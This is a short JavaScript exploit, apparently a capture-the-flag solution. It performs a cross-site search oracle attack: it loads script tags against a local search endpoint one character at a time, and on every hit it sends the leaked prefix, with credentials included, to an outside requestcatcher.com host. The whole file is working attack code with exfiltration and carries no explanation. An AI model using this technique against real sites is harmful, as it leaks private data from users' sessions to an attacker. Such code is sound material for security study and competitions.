var chars =
	"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"$'()+,-./:;<=>?@[\\]^`{|}_";
var charLen = chars.length;
var ENDPOINT =
	"http://127.0.0.1:1337/api/entries/search?q=";

const search = (leak, charCounter) => {
	// Check if the character is valid
	var curChar = chars[charCounter];

	let script = document.createElement("script");
	script.src = ENDPOINT + leak + curChar;
	document.head.appendChild(script);

	// console.log(script.src);
	script.onload = () => {
		fetch(
			"https://khaingmyel.requestcatcher.com/test/flag?=" +
				escape(leak) +
				curChar,
			{
				method: "GET",
				mode: "no-cors",
				credentials: "include",
			}
		);
		leak += curChar;
		search(leak, (charCounter + 1) % charLen);
	};
	script.onerror = () => {
		search(leak, (charCounter + 1) % charLen);
	};
};

function exploit() {
	search("B", 0);
}

exploit();
